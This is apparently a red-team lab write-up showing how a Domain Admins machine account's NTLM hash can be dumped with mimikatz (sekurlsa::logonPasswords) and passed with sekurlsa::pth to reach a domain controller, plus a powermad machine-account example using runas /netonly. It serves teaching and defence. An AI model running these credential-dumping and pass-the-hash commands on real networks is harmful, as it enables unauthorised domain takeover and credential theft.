# Pass the Hash with Machine$ Accounts

## Pass the Hash with Machine$ Accounts

This lab looks at leveraging machine account NTLM password hashes or more specifically - how they can be used in pass the hash attacks to gain additional privileges, depending on which groups the machine is a member of (ideally administrators/domain administrators).

This labs is based on an assumption that you have gained local administrator privileges on a workstation (machine), let's call it `WS01$`. Since you have done your AD enumeration, you notice that the WS01$ is a member of `Domain Admins` group - congratulations, you are one step away from escalating from local admin to Domain Admin and a full domain compromise.

### Execution

Finding domain computers that are members of interesting groups:

{% code title="attacker\@victim" %}
```csharp
Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUuZevYH_7Rw1lASLHY%2F-LUukkle52vfUfQNN4La%2FScreenshot%20from%202018-12-29%2016-03-19.png?alt=media\&token=2b3a6fe0-5068-4570-8d57-850ff291d292)

Of course, the same can be observed by simply checking the Domain Admins net group:

{% code title="attacker\@victim" %}
```csharp
net group "domain admins" /domain
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUuyM3KYHqpDeEdvhsq%2F-LUuzQKXm9SftLBJy13u%2FScreenshot%20from%202018-12-29%2017-22-59.png?alt=media\&token=88ba9b67-e597-4cd5-8e89-fc2e35a68b21)

or administrators group (not applicable to our lab, but showing as a sidenote):

{% code title="attacker\@victim" %}
```csharp
net localgroup administrators /domain
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUuyM3KYHqpDeEdvhsq%2F-LUuzgWNIscLmiaWHJ0V%2FScreenshot%20from%202018-12-29%2017-24-07.png?alt=media\&token=6dfc748d-677a-42ed-93cb-7e08beee1565)

In AD, the highlighted part can be seen here:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUuoXO0chEcOD_0zFWe%2F-LUuovUEZ_wDea99EdgM%2FScreenshot%20from%202018-12-29%2016-36-17.png?alt=media\&token=27575816-6f8b-45fb-90a7-5b5633f764e8)

Extracting the machine `WS01$` NTLM hash after the admin privileges were gained on the system:

{% code title="attacker\@victim" %}
```csharp
sekurlsa::logonPasswords
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUuZevYH_7Rw1lASLHY%2F-LUukZyRrwlCf8zDRmIW%2FScreenshot%20from%202018-12-29%2015-29-17.png?alt=media\&token=34fcbe4c-8054-426e-87eb-81cfc4da5ec3)

Let's check that our current compromised user `ws01\mantvydas` (local admin on ws01) cannot access the domain controller DC01 just yet:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUuZevYH_7Rw1lASLHY%2F-LUukbZs8ndBgu0jksV7%2FScreenshot%20from%202018-12-29%2015-47-10.png?alt=media\&token=72c823b6-7290-48b1-9033-dbdc453e18c1)

Since WS01$ machine is a member of `Domain Admins` and we have extracted the machine's hash with mimikatz, we can use mimikatz to pass that hash and effectively elevate our access to Domain Admin:

{% code title="attacker\@victim" %}
```csharp
sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUuoXO0chEcOD_0zFWe%2F-LUup_h6QZz_PyGpjBdZ%2FScreenshot%20from%202018-12-29%2015-52-35.png?alt=media\&token=0382cdb0-d0f3-40d6-9ac8-5e248e1b6e76)

Below shows how the machine's hash is passed which results in an elevated cmd.exe prompt. Using the elevated prompt enables us to access the domain controller as shown with `dir \\dc01\c$`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LUuZevYH_7Rw1lASLHY%2F-LUuke2W4awh1X2YwEoi%2FPeek%202018-12-29%2015-49.gif?alt=media\&token=4d15dc64-86fc-4294-8c8b-d617e125c2d2)

### Remember

It's worth re-emphasizing that computer/machine accounts are essentially the same as user accounts and can be as dangerous if misconfigured.

Let's create a new machine account with powermad like so:

```csharp
New-MachineAccount -MachineAccount testmachine
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoB_8R0ZLxhCxkexWu5%2F-LoB_H5TjHeuvoRB0YvW%2Fimage.png?alt=media\&token=6d3a8b4c-210b-4c3e-8e12-17732bf2701b)

Now, let's say someone added the testmachine$ account into Domain Admins:

```csharp
Get-NetGroupMember "domain admins" | select membern*
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoB_8R0ZLxhCxkexWu5%2F-LoBgH9nlN3r5nD25Cx0%2Fimage.png?alt=media\&token=73099fbc-3843-4288-9fce-79ab191c9068)

...if we somehow get hold of the testmachine$ password, we can escalate to a DA. We can check this by opening a new console and logging in as testmachine$ with `/netonly` flag. Note how initially the user spotless cannot list files on the DC01, but once `runas /user:testmachine$ /netonly powershell` is run and the password is provided, DC01 is no longer complaining and allows spotless listing its file system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LoB_8R0ZLxhCxkexWu5%2F-LoBft21u9a7ydX7lrKM%2Fimage.png?alt=media\&token=c38685cd-640b-404a-bd6b-6dcd9a4e1493)

### References
